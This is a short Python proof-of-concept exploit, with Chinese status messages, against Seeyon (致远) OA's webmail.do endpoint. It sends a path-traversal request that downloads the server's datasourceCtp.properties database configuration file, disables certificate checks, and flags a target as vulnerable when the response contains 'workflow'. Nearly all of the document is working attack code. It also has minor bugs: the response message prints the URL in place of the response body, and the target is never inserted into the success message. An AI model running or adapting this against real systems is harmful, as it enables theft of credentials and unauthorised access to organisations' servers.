import time
import requests
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    vuln_url = target_url + "seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    success_msg = now_time() + '[SUCCESS]目标 {} 存在致远OA webmail.do 任意文件下载漏洞'
    warning_msg = now_time() + '[WARNING]不存在致远OA webmail.do 任意文件下载漏洞'
    error_msg = now_time() + '[致远OA webmail.do 任意文件下载漏洞][ERROR]目标可能无法连接'
    try:
        requests.packages.urllib3.disable_warnings()
        #console.print(now_time() + " [INFO]     正在请求: {}".format(vuln_url), style='bold blue')
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        shell_msg = now_time() + '响应为: \n\n{}'.format(vuln_url, response.text)
        if "workflow" in response.text:
            return success_msg,shell_msg
        else:
            return warning_msg
    except:
        return error_msg


